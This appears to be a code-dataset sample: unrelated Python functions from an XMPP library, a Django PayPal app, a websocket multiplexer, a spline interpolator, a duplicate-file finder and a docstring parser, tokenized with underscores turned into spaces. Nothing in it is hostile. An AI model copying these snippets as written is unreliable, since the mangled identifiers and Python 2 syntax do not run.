( args , "groups" , None ) : args . groups = [ g . decode ( "utf-8" ) for g in args . groups ] logging . basic Config ( level = args . log level ) if args . trace : print "enabling trace" handler = logging . Stream Handler ( ) handler . set Level ( logging . DEBUG ) for logger in ( "pyxmpp2.IN" , "pyxmpp2.OUT" ) : logger = logging . get Logger ( logger ) logger . set Level ( logging . DEBUG ) logger . add Handler ( handler ) logger . propagate = False if args . action == "monitor" or args . action == "show" and args . presence : # According to RFC6121 it could be None for 'monitor' (no need to send # initial presence to request roster), but Google seems to require that # to send roster pushes settings [ "initial presence" ] = Presence ( priority = - 1 ) else : settings [ "initial presence" ] = None tool = Roster Tool ( JID ( args . jid ) , args , settings ) try : tool . run ( ) except Keyboard Interrupt : tool . disconnect ( )
def run ( self ) : if self . args . roster cache and os . path . exists ( self . args . roster cache ) : logging . info ( u"Loading roster from {0!r}" . format ( self . args . roster cache ) ) try : self . client . roster client . load roster ( self . args . roster cache ) except ( IO Error , Value Error ) , err : logging . error ( u"Could not load the roster: {0!r}" . format ( err ) ) self . client . connect ( ) self . client . run ( )
def configure io handler ( self , handler ) : if self . check events ( ) : return if handler in self . unprepared handlers : old fileno = self . unprepared handlers [ handler ] prepared = self . prepare io handler ( handler ) else : old fileno = None prepared = True fileno = handler . fileno ( ) if old fileno is not None and fileno != old fileno : del self . handlers [ old fileno ] try : self . poll . unregister ( old fileno ) except Key Error : # The socket has changed, but the old one isn't registered, # e.g. ``prepare`` wants to connect again pass if not prepared : self . unprepared handlers [ handler ] = fileno if not fileno : return self . handlers [ fileno ] = handler events = 0 if handler . is readable ( ) : logger . debug ( " {0!r} readable" . format ( handler ) ) events |= select . POLLIN if handler . is writable ( ) : logger . debug ( " {0!r} writable" . format ( handler ) ) events |= select . POLLOUT if events : logger . debug ( " registering {0!r} handler fileno {1} for" " events {2}" . format ( handler , fileno , events ) ) self . poll . register ( fileno , events )
def remove ( self ) : if self . disco is None : return self . xmlnode . unlink Node ( ) oldns = self . xmlnode . ns ( ) ns = self . xmlnode . new Ns ( oldns . get Content ( ) , None ) self . xmlnode . replace Ns ( oldns , ns ) common root . add Child ( self . xmlnode ( ) ) self . disco = None
def fetch ( self ) : from . . iq import Iq jid , node = self . address iq = Iq ( to jid = jid , stanza type = "get" ) disco = self . disco class ( node ) iq . add content ( disco . xmlnode ) self . stream . set response handlers ( iq , self . response , self . error , self . timeout ) self . stream . send ( iq )
def handle tls connected event ( self , event ) : if self . settings [ "tls verify peer" ] : valid = self . settings [ "tls verify callback" ] ( event . stream , event . peer certificate ) if not valid : raise SSL Error ( "Certificate verification failed" ) event . stream . tls established = True with event . stream . lock : event . stream . restart stream ( )
def main ( ) : parser = argparse . Argument Parser ( description = 'XMPP version checker' , parents = [ XMPP Settings . get arg parser ( ) ] ) parser . add argument ( 'source' , metavar = 'SOURCE' , help = 'Source JID' ) parser . add argument ( 'target' , metavar = 'TARGET' , nargs = '?' , help = 'Target JID (default: domain of SOURCE)' ) parser . add argument ( '--debug' , action = 'store const' , dest = 'log level' , const = logging . DEBUG , default = logging . INFO , help = 'Print debug messages' ) parser . add argument ( '--quiet' , const = logging . ERROR , action = 'store const' , dest = 'log level' , help = 'Print only error messages' ) args = parser . parse args ( ) settings = XMPP Settings ( ) settings . load arguments ( args ) if settings . get ( "password" ) is None : password = getpass ( "{0!r} password: " . format ( args . source ) ) if sys . version info . major < 3 : password = password . decode ( "utf-8" ) settings [ "password" ] = password if sys . version info . major < 3 : args . source = args . source . decode ( "utf-8" ) source = JID ( args . source ) if args . target : if sys . version info . major < 3 : args . target = args . target . decode ( "utf-8" ) target = JID ( args . target ) else : target = JID ( source . domain ) logging . basic Config ( level = args . log level ) checker = Version Checker ( source , target , settings ) try : checker . run ( ) except Keyboard Interrupt : checker . disconnect ( )
def handle authorized ( self , event ) : request software version ( self . client , self . target jid , self . success , self . failure )
def decode error ( self ) : error qname = self . ns prefix + "error" for child in self . element : if child . tag == error qname : self . error = Stanza Error Element ( child ) return raise Bad Request Protocol Error ( "Error element missing in" " an error stanza" )
def leave ( self ) : if self . joined : p = Muc Presence ( to jid = self . room jid , stanza type = "unavailable" ) self . manager . stream . send ( p )
def validate string list ( value ) : try : if sys . version info . major < 3 : # pylint: disable-msg=W0404 from locale import getpreferredencoding encoding = getpreferredencoding ( ) value = value . decode ( encoding ) return [ x . strip ( ) for x in value . split ( u"," ) ] except ( Attribute Error , Type Error , Unicode Error ) : raise Value Error ( "Bad string list" )
def stop ( self ) : with self . lock : for dummy in self . threads : self . queue . put ( None )
def run ( self , thread n ) : try : logger . debug ( "{0!r}: entering thread #{1}" . format ( self , thread n ) ) resolver = self . make resolver ( ) while True : request = self . queue . get ( ) if request is None : break method , args = request logger . debug ( " calling {0!r}.{1}{2!r}" . format ( resolver , method , args ) ) getattr ( resolver , method ) ( * args ) # pylint: disable=W0142 self . queue . task done ( ) logger . debug ( "{0!r}: leaving thread #{1}" . format ( self , thread n ) ) finally : self . threads . remove ( threading . current Thread ( ) )
def connect ( self , server = None , port = None ) : if self . me . node or self . me . resource : raise Value ( "Component JID may have only domain defined" ) if not server : server = self . server if not port : port = self . port if not server or not port : raise Value Error ( "Server or port not given" ) Stream . connect ( self , server , port , None , self . me )
def set state ( self , state ) : logger . debug ( "  set state({0!r})" . format ( state ) ) self . state = state self . state cond . notify ( )
def connect ( self , addr , port , service ) : self . dst name = addr self . dst port = port family = None try : res = socket . getaddrinfo ( addr , port , socket . AF UNSPEC , socket . SOCK STREAM , 0 , socket . AI NUMERICHOST ) family = res [ 0 ] [ 0 ] sockaddr = res [ 0 ] [ 4 ] except socket . gaierror : family = None sockaddr = None if family is not None : if not port : raise Value Error ( "No port number given with literal IP address" ) self . dst service = None self . family = family self . dst addrs = [ ( family , sockaddr ) ] self . set state ( "connect" ) elif service is not None : self . dst service = service self . set state ( "resolve-srv" ) self . dst name = addr elif port : self . dst nameports = [ ( self . dst name , self . dst port ) ] self . dst service = None self . set state ( "resolve-hostname" ) else : raise Value Error ( "No port number and no SRV service name given" )
def resolve srv ( self ) : resolver = self . settings [ "dns resolver" ] # pylint: disable=W0621 self . set state ( "resolving-srv" ) self . event ( Resolving SRV Event ( self . dst name , self . dst service ) ) resolver . resolve srv ( self . dst name , self . dst service , "tcp" , callback = self . got srv )
def connected ( self ) : self . auth properties [ 'remote-ip' ] = self . dst addr [ 0 ] if self . dst service : self . auth properties [ 'service-domain' ] = self . dst name if self . dst hostname is not None : self . auth properties [ 'service-hostname' ] = self . dst hostname else : self . auth properties [ 'service-hostname' ] = self . dst addr [ 0 ] self . auth properties [ 'security-layer' ] = None self . event ( Connected Event ( self . dst addr ) ) self . set state ( "connected" ) self . stream . transport connected ( )
def send stream tail ( self ) : with self . lock : if not self . socket or self . hup : logger . debug ( u"Cannot send stream closing tag: already closed" ) return data = self . serializer . emit tail ( ) try : self . write ( data . encode ( "utf-8" ) ) except ( IO Error , System Error , socket . error ) , err : logger . debug ( u"Sending stream closing tag failed: {0}" . format ( err ) ) self . serializer = None self . hup = True if self . tls state is None : try : self . socket . shutdown ( socket . SHUT WR ) except socket . error : pass self . set state ( "closing" ) self . write queue . clear ( ) self . write queue cond . notify ( )
def send element ( self , element ) : with self . lock : if self . eof or self . socket is None or not self . serializer : logger . debug ( "Dropping element: {0}" . format ( element to unicode ( element ) ) ) return data = self . serializer . emit stanza ( element ) self . write ( data . encode ( "utf-8" ) )
def initiate starttls ( self , * * kwargs ) : if self . tls state == "connected" : raise Runtime Error ( "Already TLS-connected" ) kwargs [ "do handshake on connect" ] = False logger . debug ( "Wrapping the socket into ssl" ) self . socket = ssl . wrap socket ( self . socket , * * kwargs ) self . set state ( "tls-handshake" ) self . continue tls handshake ( )
def continue tls handshake ( self ) : try : logger . debug ( " do handshake()" ) self . socket . do handshake ( ) except ssl . SSL Error , err : if err . args [ 0 ] == ssl . SSL ERROR WANT READ : self . tls state = "want read" logger . debug ( "   want read" ) self . state cond . notify ( ) return elif err . args [ 0 ] == ssl . SSL ERROR WANT WRITE : self . tls state = "want write" logger . debug ( "   want write" ) self . write queue . appendleft ( TLS Handshake ) return else : raise self . tls state = "connected" self . set state ( "connected" ) self . auth properties [ 'security-layer' ] = "TLS" if "tls-unique" in CHANNEL BINDING TYPES : try : # pylint: disable=E1103 tls unique = self . socket . get channel binding ( "tls-unique" ) except Value Error : pass else : self . auth properties [ 'channel-binding' ] = { "tls-unique" : tls unique } try : cipher = self . socket . cipher ( ) except Attribute Error : # SSL Socket.cipher doesn't work on Py Py cipher = "unknown" cert = get certificate from ssl socket ( self . socket ) self . event ( TLS Connected Event ( cipher , cert ) )
def handle read ( self ) : with self . lock : logger . debug ( "handle read()" ) if self . eof or self . socket is None : return if self . state == "tls-handshake" : while True : logger . debug ( "tls handshake read..." ) self . continue tls handshake ( ) logger . debug ( "  state: {0}" . format ( self . tls state ) ) if self . tls state != "want read" : break elif self . tls state == "connected" : while self . socket and not self . eof : logger . debug ( "tls socket read..." ) try : data = self . socket . read ( 4096 ) except ssl . SSL Error , err : if err . args [ 0 ] == ssl . SSL ERROR WANT READ : break elif err . args [ 0 ] == ssl . SSL ERROR WANT WRITE : break else : raise except socket . error , err : if err . args [ 0 ] == errno . EINTR : continue elif err . args [ 0 ] in BLOCKING ERRORS : break elif err . args [ 0 ] == errno . ECONNRESET : logger . warning ( "Connection reset by peer" ) data = None else : raise self . feed reader ( data ) else : while self . socket and not self . eof : logger . debug ( "raw socket read..." ) try : data = self . socket . recv ( 4096 ) except socket . error , err : if err . args [ 0 ] == errno . EINTR : continue elif err . args [ 0 ] in BLOCKING ERRORS : break elif err . args [ 0 ] == errno . ECONNRESET : logger . warning ( "Connection reset by peer" ) data = None else : raise self . feed reader ( data )
def handle err ( self ) : with self . lock : if self . state == 'connecting' and self . dst addrs : self . hup = False self . set state ( "connect" ) return self . socket . close ( ) self . socket = None self . set state ( "aborted" ) self . write queue . clear ( ) self . write queue cond . notify ( ) raise Py XMPPIO Error ( "Unhandled error on socket" )
def disconnect ( self ) : logger . debug ( "TCP Transport.disconnect()" ) with self . lock : if self . socket is None : if self . state != "closed" : self . event ( Disconnected Event ( self . dst addr ) ) self . set state ( "closed" ) return if self . hup or not self . serializer : self . close ( ) else : self . send stream tail ( )
def close ( self ) : if self . state != "closed" : self . event ( Disconnected Event ( self . dst addr ) ) self . set state ( "closed" ) if self . socket is None : return try : self . socket . shutdown ( socket . SHUT RDWR ) except socket . error : pass self . socket . close ( ) self . socket = None self . write queue . clear ( ) self . write queue cond . notify ( )
def event ( self , event ) : logger . debug ( u"TCP transport event: {0}" . format ( event ) ) if self . stream : event . stream = self . stream self . event queue . put ( event )
def run ( self ) : # pylint: disable-msg=W0212 timeout = self . method . pyxmpp timeout recurring = self . method . pyxmpp recurring while not self . quit and timeout is not None : if timeout : time . sleep ( timeout ) if self . quit : break ret = self . method ( ) if recurring is None : timeout = ret elif not recurring : break
def run io threads ( self , handler ) : reader = Reading Thread ( self . settings , handler , daemon = self . daemon , exc queue = self . exc queue ) writter = Writting Thread ( self . settings , handler , daemon = self . daemon , exc queue = self . exc queue ) self . io threads += [ reader , writter ] reader . start ( ) writter . start ( )
def remove io handler ( self , handler ) : if handler not in self . io handlers : return self . io handlers . remove ( handler ) for thread in self . io threads : if thread . io handler is handler : thread . stop ( )
def add timeout handler ( self , handler ) : self . timeout handlers . append ( handler ) if self . event thread is None : return self . run timeout threads ( handler )
def run timeout threads ( self , handler ) : # pylint: disable-msg=W0212 for dummy , method in inspect . getmembers ( handler , callable ) : if not hasattr ( method , " pyxmpp timeout" ) : continue thread = Timeout Thread ( method , daemon = self . daemon , exc queue = self . exc queue ) self . timeout threads . append ( thread ) thread . start ( )
def remove timeout handler ( self , handler ) : if handler not in self . timeout handlers : return self . timeout handlers . remove ( handler ) for thread in self . timeout threads : if thread . method . im self is handler : thread . stop ( )
def start ( self , daemon = False ) : self . daemon = daemon self . io threads = [ ] self . event thread = Event Dispatcher Thread ( self . event dispatcher , daemon = daemon , exc queue = self . exc queue ) self . event thread . start ( ) for handler in self . io handlers : self . run io threads ( handler ) for handler in self . timeout handlers : self . run timeout threads ( handler )
def auth finish ( self , unused ) : self . lock . acquire ( ) try : self . logger . debug ( "Authenticated" ) self . authenticated = True self . state change ( "authorized" , self . my jid ) self . post auth ( ) finally : self . lock . release ( )
def configure io handler ( self , handler ) : if self . check events ( ) : return if handler in self . unprepared handlers : old fileno = self . unprepared handlers [ handler ] prepared = self . prepare io handler ( handler ) else : old fileno = None prepared = True fileno = handler . fileno ( ) if old fileno is not None and fileno != old fileno : del self . handlers [ old fileno ] # remove handler won't raise something like Key Error if the fd # isn't registered; it will just print a debug log. self . io loop . remove handler ( old fileno ) if not prepared : self . unprepared handlers [ handler ] = fileno if not fileno : return update = fileno in self . handlers events = ioloop . IO Loop . NONE if handler . is readable ( ) : logger . debug ( " {0!r} readable" . format ( handler ) ) events |= ioloop . IO Loop . READ if handler . is writable ( ) : logger . debug ( " {0!r} writable" . format ( handler ) ) events |= ioloop . IO Loop . WRITE if self . handlers . get ( fileno , None ) == events : return self . handlers [ fileno ] = events if events : logger . debug ( " registering {0!r} handler fileno {1} for" " events {2}" . format ( handler , fileno , events ) ) if update : self . io loop . update handler ( fileno , events ) else : self . io loop . add handler ( fileno , partial ( self . handle event , handler ) , events )
def send stream start ( self , stream id = None , stream to = None ) : if self . output state in ( "open" , "closed" ) : raise Stream Error ( "Stream start already sent" ) if not self . language : self . language = self . settings [ "language" ] if stream to : stream to = unicode ( stream to ) elif self . peer and self . initiator : stream to = unicode ( self . peer ) stream from = None if self . me and ( self . tls established or not self . initiator ) : stream from = unicode ( self . me ) if stream id : self . stream id = stream id else : self . stream id = None self . transport . send stream head ( self . stanza namespace , stream from , stream to , self . stream id , language = self . language ) self . output state = "open"
def send stream error ( self , condition ) : if self . output state is "closed" : return if self . output state in ( None , "restart" ) : self . send stream start ( ) element = Stream Error Element ( condition ) . as xml ( ) self . transport . send element ( element ) self . transport . disconnect ( ) self . output state = "closed"
def restart stream ( self ) : self . input state = "restart" self . output state = "restart" self . features = None self . transport . restart ( ) if self . initiator : self . send stream start ( self . stream id )
def send ( self , stanza ) : self . fix out stanza ( stanza ) element = stanza . as xml ( ) self . write element ( element )
def uplink receive ( self , stanza ) : with self . lock : if self . stanza route : self . stanza route . uplink receive ( stanza ) else : logger . debug ( u"Stanza dropped (no route): {0!r}" . format ( stanza ) )
def main ( ) : parser = argparse . Argument Parser ( description = 'XMPP echo bot' , parents = [ XMPP Settings . get arg parser ( ) ] ) parser . add argument ( 'jid' , metavar = 'JID' , help = 'The bot JID' ) parser . add argument ( '--debug' , action = 'store const' , dest = 'log level' , const = logging . DEBUG , default = logging . INFO , help = 'Print debug messages' ) parser . add argument ( '--quiet' , const = logging . ERROR , action = 'store const' , dest = 'log level' , help = 'Print only error messages' ) parser . add argument ( '--trace' , action = 'store true' , help = 'Print XML data sent and received' ) args = parser . parse args ( ) settings = XMPP Settings ( { "software name" : "Echo Bot" } ) settings . load arguments ( args ) if settings . get ( "password" ) is None : password = getpass ( "{0!r} password: " . format ( args . jid ) ) if sys . version info . major < 3 : password = password . decode ( "utf-8" ) settings [ "password" ] = password if sys . version info . major < 3 : args . jid = args . jid . decode ( "utf-8" ) logging . basic Config ( level = args . log level ) if args . trace : print "enabling trace" handler = logging . Stream Handler ( ) handler . set Level ( logging . DEBUG ) for logger in ( "pyxmpp2.IN" , "pyxmpp2.OUT" ) : logger = logging . get Logger ( logger ) logger . set Level ( logging . DEBUG ) logger . add Handler ( handler ) logger . propagate = False bot = Echo Bot ( JID ( args . jid ) , settings ) try : bot . run ( ) except Keyboard Interrupt : bot . disconnect ( )
def handle read ( self ) : with self . lock : logger . debug ( "handle read()" ) if self . socket is None : return while True : try : sock , address = self . socket . accept ( ) except socket . error , err : if err . args [ 0 ] in BLOCKING ERRORS : break else : raise logger . debug ( "Accepted connection from: {0!r}" . format ( address ) ) self . target ( sock , address )
def decode subelements ( self ) : for child in self . element : if child . tag == self . show tag : self . show = child . text elif child . tag == self . status tag : self . status = child . text elif child . tag == self . priority tag : try : self . priority = int ( child . text . strip ( ) ) if self . priority < - 128 or self . priority > 127 : raise Value Error except Value Error : raise Bad Request Protocol Error ( "Presence priority not an integer" )
def activate ( self ) : obj = self . find paypal object ( ) if obj . state == enums . Billing Plan State . CREATED : success = obj . activate ( ) if not success : raise Paypal Api Error ( "Failed to activate plan: %r" % ( obj . error ) ) # Resync the updated data to the database self . get or update from api data ( obj , always sync = True ) return obj
def check paypal api key ( app configs = None , * * kwargs ) : messages = [ ] mode = getattr ( djpaypal settings , "PAYPAL MODE" , None ) if mode not in VALID MODES : msg = "Invalid PAYPAL MODE specified: {}." . format ( repr ( mode ) ) hint = "PAYPAL MODE must be one of {}" . format ( ", " . join ( repr ( k ) for k in VALID MODES ) ) messages . append ( checks . Critical ( msg , hint = hint , id = "djpaypal.C001" ) ) for setting in "PAYPAL CLIENT ID" , "PAYPAL CLIENT SECRET" : if not getattr ( djpaypal settings , setting , None ) : msg = "Invalid value specified for {}" . format ( setting ) hint = "Add PAYPAL CLIENT ID and PAYPAL CLIENT SECRET to your settings." messages . append ( checks . Critical ( msg , hint = hint , id = "djpaypal.C002" ) ) return messages
async def create upstream applications ( self ) : loop = asyncio . get event loop ( ) for steam name , Applications Cls in self . applications . items ( ) : application = Applications Cls ( self . scope ) upstream queue = asyncio . Queue ( ) self . application streams [ steam name ] = upstream queue self . application futures [ steam name ] = loop . create task ( application ( upstream queue . get , partial ( self . dispatch downstream , steam name = steam name ) ) )
async def receive json ( self , content , * * kwargs ) : # Check the frame looks good if isinstance ( content , dict ) and "stream" in content and "payload" in content : # Match it to a channel steam name = content [ "stream" ] payload = content [ "payload" ] # block upstream frames if steam name not in self . applications accepting frames : raise Value Error ( "Invalid multiplexed frame received (stream not mapped)" ) # send it on to the application that handles this stream await self . send upstream ( message = { "type" : "websocket.receive" , "text" : await self . encode json ( payload ) } , stream name = steam name ) return else : raise Value Error ( "Invalid multiplexed **frame received (no channel/payload key)" )
async def disconnect ( self , code ) : try : await asyncio . wait ( self . application futures . values ( ) , return when = asyncio . ALL COMPLETED , timeout = self . application close timeout ) except asyncio . Timeout Error : pass
async def websocket send ( self , message , stream name ) : text = message . get ( "text" ) # todo what to do on binary! json = await self . decode json ( text ) data = { "stream" : stream name , "payload" : json } await self . send json ( data )
def set interpolation coefficients ( self ) : left boundary slope = 0 right boundary slope = 0 if isinstance ( self . boundary condition , tuple ) : left boundary slope = self . boundary condition [ 0 ] right boundary slope = self . boundary condition [ 1 ] elif self . boundary condition is None : pass else : msg = 'The given object {} of type {} is not a valid condition ' 'for the border' . format ( self . boundary condition , type ( self . boundary condition ) ) raise Value Error ( msg ) # getting the values such that we get a continuous second derivative # by solving a system of linear equations # setup the matrix n = len ( self . x list ) mat = numpy . zeros ( ( n , n ) ) b = numpy . zeros ( ( n , 1 ) ) x = self . x list y = self . y list if n > 2 : for i in range ( 1 , n - 1 ) : mat [ i , i - 1 ] = 1.0 / ( x [ i ] - x [ i - 1 ] ) mat [ i , i + 1 ] = 1.0 / ( x [ i + 1 ] - x [ i ] ) mat [ i , i ] = 2 * ( mat [ i , i - 1 ] + mat [ i , i + 1 ] ) b [ i , 0 ] = 3 * ( ( y [ i ] - y [ i - 1 ] ) / ( x [ i ] - x [ i - 1 ] ) ** 2 + ( y [ i + 1 ] - y [ i ] ) / ( x [ i + 1 ] - x [ i ] ) ** 2 ) elif n < 2 : raise Value Error ( 'too less points for interpolation' ) if self . boundary condition is None : # not a knot mat [ 0 , 0 ] = 1.0 / ( x [ 1 ] - x [ 0 ] ) ** 2 mat [ 0 , 2 ] = - 1.0 / ( x [ 2 ] - x [ 1 ] ) ** 2 mat [ 0 , 1 ] = mat [ 0 , 0 ] + mat [ 0 , 2 ] b [ 0 , 0 ] = 2.0 * ( ( y [ 1 ] - y [ 0 ] ) / ( x [ 1 ] - x [ 0 ] ) ** 3 - ( y [ 2 ] - y [ 1 ] ) / ( x [ 2 ] - x [ 1 ] ) ** 3 ) mat [ n - 1 , n - 3 ] = 1.0 / ( x [ n - 2 ] - x [ n - 3 ] ) ** 2 mat [ n - 1 , n - 1 ] = - 1.0 / ( x [ n - 1 ] - x [ n - 2 ] ) ** 2 mat [ n - 1 , n - 2 ] = mat [ n - 1 , n - 3 ] + mat [ n - 1 , n - 1 ] b [ n - 1 , 0 ] = 2.0 * ( ( y [ n - 2 ] - y [ n - 3 ] ) / ( x [ n - 2 ] - x [ n - 3 ] ) ** 3 - ( y [ n - 1 ] - y [ n - 2 ] ) / ( x [ n - 1 ] - x [ n - 2 ] ) ** 3 ) else : mat [ 0 , 0 ] = 2.0 / ( x [ 1 ] - x [ 0 ] ) mat [ 0 , 1 ] = 1.0 / ( x [ 1 ] - x [ 0 ] ) b [ 0 , 0 ] = 3 * ( y [ 1 ] - y [ 0 ] ) / ( x [ 1 ] - x [ 0 ] ) ** 2 - 0.5 * left boundary slope mat [ n - 1 , n - 2 ] = 1.0 / ( x [ n - 1 ] - x [ n - 2 ] ) mat [ n - 1 , n - 1 ] = 2.0 / ( x [ n - 1 ] - x [ n - 2 ] ) b [ n - 1 , 0 ] = 3 * ( y [ n - 1 ] - y [ n - 2 ] ) / ( x [ n - 1 ] - x [ n - 2 ] ) ** 2 + 0.5 * right boundary slope k = numpy . linalg . solve ( mat , b ) for i in range ( 1 , n ) : c1 = k [ i - 1 , 0 ] * ( x [ i ] - x [ i - 1 ] ) - ( y [ i ] - y [ i - 1 ] ) c2 = - k [ i , 0 ] * ( x [ i ] - x [ i - 1 ] ) + ( y [ i ] - y [ i - 1 ] ) self . interpolation coefficients . append ( [ c1 , c2 ] )
def main ( ) : # pylint: disable=bad-continuation from optparse import Option Parser , Option Group parser = Option Parser ( usage = "%prog [options] <folder path> ..." , version = "%s v%s" % ( appname , version ) ) parser . add option ( '-D' , '--defaults' , action = "store true" , dest = "defaults" , default = False , help = "Display the default values for options which take" " arguments and then exit." ) parser . add option ( '-E' , '--exact' , action = "store true" , dest = "exact" , default = False , help = "There is a vanishingly small chance of false" " positives when comparing files using sizes and hashes. This option" " enables exact comparison. However, exact comparison requires a lot" " of disk seeks, so, on traditional moving-platter media, this trades" " a LOT of performance for a very tiny amount of safety most people" " don't need." ) # XXX: Should I add --verbose and/or --quiet? filter group = Option Group ( parser , "Input Filtering" ) filter group . add option ( '-e' , '--exclude' , action = "append" , dest = "exclude" , metavar = "PAT" , help = "Specify a globbing pattern to be" " added to the internal blacklist. This option can be used multiple" " times. Provide a dash (-) as your first exclude to override the" " pre-programmed defaults." ) filter group . add option ( '--min-size' , action = "store" , type = "int" , dest = "min size" , metavar = "X" , help = "Specify a non-default minimum size" ". Files below this size (default: %default bytes) will be ignored." ) parser . add option group ( filter group ) behaviour group = Option Group ( parser , "Output Behaviour" ) behaviour group . add option ( '-d' , '--delete' , action = "store true" , dest = "delete" , help = "Prompt the user for files to preserve and delete " "all others." ) behaviour group . add option ( '-n' , '--dry-run' , action = "store true" , dest = "dry run" , metavar = "PREFIX" , help = "Don't actually delete any " "files. Just list what actions would be performed. (Good for testing " "values for --prefer)" ) behaviour group . add option ( '--prefer' , action = "append" , dest = "prefer" , metavar = "PATH" , default = [ ] , help = "Append a globbing pattern which " "--delete should automatically prefer (rather than prompting) when it " "occurs in a list of duplicates." ) behaviour group . add option ( '--noninteractive' , action = "store true" , dest = "noninteractive" , help = "When using --delete, automatically assume" " 'all' for any groups with no --prefer matches rather than prompting" ) parser . add option group ( behaviour group ) parser . set defaults ( * * DEFAULTS ) # pylint: disable=W0142 opts , args = parser . parse args ( ) if '-' in opts . exclude : opts . exclude = opts . exclude [ opts . exclude . index ( '-' ) + 1 : ] opts . exclude = [ x . rstrip ( os . sep + ( os . altsep or '' ) ) for x in opts . exclude ] # This line is required to make it match directories if opts . defaults : print defaults ( ) sys . exit ( ) groups = find dupes ( args , opts . exact , opts . exclude , opts . min size ) if opts . delete : delete dupes ( groups , opts . prefer , not opts . noninteractive , opts . dry run ) else : for dupe Set in groups . values ( ) : print '\n' . join ( dupe Set ) + '\n'
def get summarizer ( self , name ) : if name in self . summarizers : pass elif name == 'lexrank' : from . import lexrank self . summarizers [ name ] = lexrank . summarize elif name == 'mcp' : from . import mcp summ self . summarizers [ name ] = mcp summ . summarize return self . summarizers [ name ]
def code mapping ( level , msg , default = 99 ) : try : return code mappings by level [ level ] [ msg ] except Key Error : pass # Following assumes any variable messages take the format # of 'Fixed text "variable text".' only: # e.g. 'Unknown directive type "req".' # ---> 'Unknown directive type' # e.g. 'Unknown interpreted text role "need".' # ---> 'Unknown interpreted text role' if msg . count ( '"' ) == 2 and ' "' in msg and msg . endswith ( '".' ) : txt = msg [ : msg . index ( ' "' ) ] return code mappings by level [ level ] . get ( txt , default ) return default
def dequote docstring ( text ) : # TODO: Process escaped characters unless raw mode? text = text . strip ( ) if len ( text ) > 6 and text [ : 3 ] == text [ - 3 : ] == '"""' : # Standard case, """...""" return text [ 3 : - 3 ] if len ( text ) > 7 and text [ : 4 ] in ( 'u"""' , 'r"""' ) and text [ - 3 : ] == '"""' : # Unicode, u"""...""", or raw r"""...""" return text [ 4 : - 3 ] # Other flake8 tools will report atypical quotes: if len ( text ) > 6 and text [ : 3 ] == text [ - 3 : ] == "'''" : return text [ 3 : - 3 ] if len ( text ) > 7 and text [ : 4 ] in ( "u'''" , "r'''" ) and text [ - 3 : ] == "'''" : return text [ 4 : - 3 ] if len ( text ) > 2 and text [ 0 ] == text [ - 1 ] == '"' : return text [ 1 : - 1 ] if len ( text ) > 3 and text [ : 2 ] in ( 'u"' , 'r"' ) and text [ - 1 ] == '"' : return text [ 2 : - 1 ] if len ( text ) > 2 and text [ 0 ] == text [ - 1 ] == "'" : return text [ 1 : - 1 ] if len ( text ) > 3 and text [ : 2 ] in ( "u'" , "r'" ) and text [ - 1 ] == "'" : return text [ 2 : - 1 ] raise Value Error ( "Bad quotes!" )
def is public ( self ) : if self . all is not None : return self . name in self . all else : return not self . name . startswith ( " " )
def is public ( self ) : # Check if we are a setter/deleter method, and mark as private if so. for decorator in self . decorators : # Given 'foo', match 'foo.bar' but not 'foobar' or 'sfoo' if re . compile ( r"^{}\." . format ( self . name ) ) . match ( decorator . name ) : return False name is public = ( not self . name . startswith ( " " ) or self . name in VARIADIC MAGIC METHODS or self . is magic ) return self . parent . is public and name is public
def is public ( self ) : return ( not self . name . startswith ( " " ) and self . parent . is class and self . parent . is public )
def parse ( self , filelike , filename ) : self . log = log self . source = filelike . readlines ( ) src = "" . join ( self . source ) # This may raise a Syntax Error: compile ( src , filename , "exec" ) self . stream = Token Stream ( String IO ( src ) ) self . filename = filename self . all = None self . future imports = set ( ) self . accumulated decorators = [ ] return self . parse module ( )
def consume ( self , kind ) : next token = self . stream . move ( ) assert next token . kind == kind
def parse docstring ( self ) : self . log . debug ( "parsing docstring, token is %r (%s)" , self . current . kind , self . current . value ) while self . current . kind in ( tk . COMMENT , tk . NEWLINE , tk . NL ) : self . stream . move ( ) self . log . debug ( "parsing docstring, token is %r (%s)" , self . current . kind , self . current . value , ) if self . current . kind == tk . STRING : docstring = self . current . value self . stream . move ( ) return docstring return None
def parse definitions ( self , class , all = False ) : while self . current is not None : self . log . debug ( "parsing definition list, current token is %r (%s)" , self . current . kind , self . current . value , ) self . log . debug ( "got newline: %s" , self . stream . got logical newline ) if all and self . current . value == " all " : self . parse all ( ) elif ( self . current . kind == tk . OP and self . current . value == "@" and self . stream . got logical newline ) : self . consume ( tk . OP ) self . parse decorators ( ) elif self . current . value in [ "def" , "class" ] : yield self . parse definition ( class . nest ( self . current . value ) ) elif self . current . kind == tk . INDENT : self . consume ( tk . INDENT ) for definition in self . parse definitions ( class ) : yield definition elif self . current . kind == tk . DEDENT : self . consume ( tk . DEDENT ) return elif self . current . value == "from" : self . parse from import statement ( ) else : self . stream . move ( )
def parse all ( self ) : assert self . current . value == " all " self . consume ( tk . NAME ) if self . current . value != "=" : raise All Error ( "Could not evaluate contents of  all . " ) self . consume ( tk . OP ) if self . current . value not in "([" : raise All Error ( "Could not evaluate contents of  all . " ) self . consume ( tk . OP ) self . all = [ ] all content = "(" while self . current . kind != tk . OP or self . current . value not in ")]" : if self . current . kind in ( tk . NL , tk . COMMENT ) : pass elif self . current . kind == tk . STRING or self . current . value == "," : all content += self . current . value else : raise All Error ( "Unexpected token kind in   all : {!r}. " . format ( self . current . kind ) ) self . stream . move ( ) self . consume ( tk . OP ) all content += ")" try : self . all = eval ( all content , { } ) except Base Exception as e : raise All Error ( "Could not evaluate contents of  all ." "\b The value was {}. The exception was:\n{}" . format ( all content , e ) )
def check current ( self , kind = None , value = None ) : msg = textwrap . dedent ( . format ( self = self ) ) kind valid = self . current . kind == kind if kind else True value valid = self . current . value == value if value else True assert kind valid and value valid , msg
